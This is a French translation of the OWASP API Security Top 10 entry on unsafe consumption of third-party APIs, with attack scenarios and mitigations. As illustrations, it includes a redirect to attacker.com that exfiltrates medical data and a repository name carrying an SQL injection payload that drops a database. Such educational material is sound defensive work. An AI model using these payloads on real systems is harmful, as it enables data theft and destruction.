# API10:2023 Unsafe Consumption of APIs

| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |
| - | - | - |
| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Courante** : Détectabilité **Moyenne** | Technique **Grave** : Spécifique à l'organisation |
| Exploiter ce problème nécessite que les attaquants identifient et compromettent potentiellement d'autres APIs/services avec lesquels l'API cible est intégrée. Habituellement, ces informations ne sont pas publiquement disponibles ou l'API/service intégré n'est pas facilement exploitable. | Les développeurs ont tendance à faire confiance et ne pas vérifier les points d'accès qui interagissent avec des API/services externes ou tiers, en se basant sur des exigences de sécurité plus faibles telles que celles concernant la sécurité du transport, l'authentification/l'autorisation et la validation des entrées. Les attaquants doivent identifier les services avec lesquels l'API cible s'intègre (sources de données) et, éventuellement, les compromettre. | L'impact varie en fonction de ce que l'API cible fait avec les données extraites. L'exploitation réussie peut entraîner une exposition d'informations sensibles à des acteurs non autorisés, de nombreux types d'injections, ou un déni de service. |

## L'API est-elle vulnérable ?

Les développeurs ont tendance à faire confiance aux données reçues des API tierces plus qu'aux entrées utilisateur. Cela est particulièrement vrai pour les API proposées par des entreprises bien connues. En raison de cela, les développeurs ont tendance à adopter des normes de sécurité plus faibles, par exemple en ce qui concerne la validation des entrées et l'analyse en vu de caractères autorisés ou non en entrée (effacés ou échappés).

L'API peut être vulnérable si :
* Elle interagit avec d'autres API sur un canal non chiffré ;
* Elle ne valide/filtre pas correctement les données collectées auprès d'autres API avant de les traiter ou de les transmettre à des composants en aval ;
* Elle suit aveuglément les redirections ;
* Elle ne limite pas le nombre de ressources disponibles pour traiter les réponses des services tiers ;
* Elle n'implémente pas de délais d'attente pour les interactions avec les services tiers.

## Exemple de scénarios d'attaque

### Scénario #1

Une API repose sur un service tiers pour enrichir les adresses commerciales fournies par les utilisateurs. Lorsqu'une adresse est fournie à l'API par l'utilisateur final, elle est envoyée au service tiers et les données renvoyées sont ensuite stockées dans une base de données locale compatible SQL.

Les attaquants utilisent le service tiers pour stocker une payload SQLi associée à une entreprise créée par eux. Ensuite, ils ciblent l'API vulnérable en fournissant une entrée spécifique qui la pousse à extraire leur "entreprise malveillante" du service tiers. La charge utile SQLi est alors exécutée par la base de données, exfiltrant des données vers un serveur contrôlé par un attaquant.

### Scénario #2

Une API s'intègre à un fournisseur de services tiers pour stocker en toute sécurité des informations médicales sensibles sur les utilisateurs. Les données sont envoyées via une connexion sécurisée en utilisant une requête HTTP comme celle ci-dessous :

```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

Des acteurs malveillants ont trouvé un moyen de compromettre l'API tierce et elle commence à répondre avec une redirection permanente `308` aux requêtes comme la précédente.

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Puisque l'API suit aveuglément les redirections, elle répète la même requête, y compris les données sensibles de l'utilisateur, vers le serveur de l'attaquant.

### Scénario #3

Un attaquant peut préparer un dépôt git nommé `'; drop db;--`.

Maintenant, lorsqu'une intégration d'une application attaquée est effectuée avec le dépôt malveillant, une charge utile d'injection SQL est utilisée sur une application qui construit une requête SQL en croyant que le nom du dépôt est une entrée sûre.

## Comment s'en prémunir ?

* Lors de l'évaluation des fournisseurs de services, évaluez leur posture de sécurité API.
* Assurez-vous que toutes les interactions API se font sur un canal de communication sécurisé (TLS).
* Validez toujours et épurez correctement les données reçues des API intégrées avant de les utiliser.
* Maintenez une liste blanche des emplacements bien connus vers lesquels les API intégrées peuvent rediriger les vôtres : ne suivez pas aveuglément les redirections.


## Références

### OWASP

* [Web Service Security Cheat Sheet][1]
* [Injection Flaws][2]
* [Input Validation Cheat Sheet][3]
* [Injection Prevention Cheat Sheet][4]
* [Transport Layer Protection Cheat Sheet][5]
* [Unvalidated Redirects and Forwards Cheat Sheet][6]

### Externes

* [CWE-20: Improper Input Validation][7]
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]
* [CWE-319: Cleartext Transmission of Sensitive Information][9]

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html
[2]: https://www.owasp.org/index.php/Injection_Flaws
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html
[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
[7]: https://cwe.mitre.org/data/definitions/20.html
[8]: https://cwe.mitre.org/data/definitions/200.html
[9]: https://cwe.mitre.org/data/definitions/319.html
